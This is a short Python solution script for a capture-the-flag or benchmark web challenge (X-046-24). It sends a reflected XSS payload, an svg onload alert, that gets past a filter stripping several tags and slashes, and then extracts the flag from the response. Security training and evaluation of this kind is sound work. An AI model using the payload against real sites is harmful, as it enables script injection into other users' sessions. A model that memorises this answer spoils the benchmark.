#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
import re
import requests
from urllib.parse import urlencode

"""
X-046-24 exploit (XSS via <svg onload>)

Usage:
  pip install requests
  python3 benchmarks/X-046-24/exp.py [BASE_URL]

Default BASE_URL: http://ip32809

The challenge filters several tags (script/img/input/a/div/iframe) and removes
slashes, but <svg> is allowed and event handlers execute. We send:
  <svg onload=alert("XSS")>
The backend uses PhantomJS to verify dialogs and returns the flag in HTML.
"""

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://ip32809"


def extract_flag(html: str):
    m = re.search(r'Here is the flag:\s*([^<\r\n]+)', html, re.I)
    if m:
        return m.group(1).strip()
    m = re.search(r'FLAG\{[^}]+\}', html)
    if m:
        return m.group(0)
    return None


def main():
    payload = '<svg onload=alert("XSS")>'
    url = f"{BASE}/page?" + urlencode({'name': payload})
    headers = {
        'User-Agent': 'Mozilla/5.0 (X-046-24-EXP)',
    }
    try:
        resp = requests.get(url, headers=headers, timeout=20)
    except Exception as e:
        print(f"[!] Request failed: {e}")
        sys.exit(2)

    flag = extract_flag(resp.text)
    if flag:
        print(flag)
        sys.exit(0)
    print(resp.text)
    sys.exit(2)


if __name__ == "__main__":
    main()

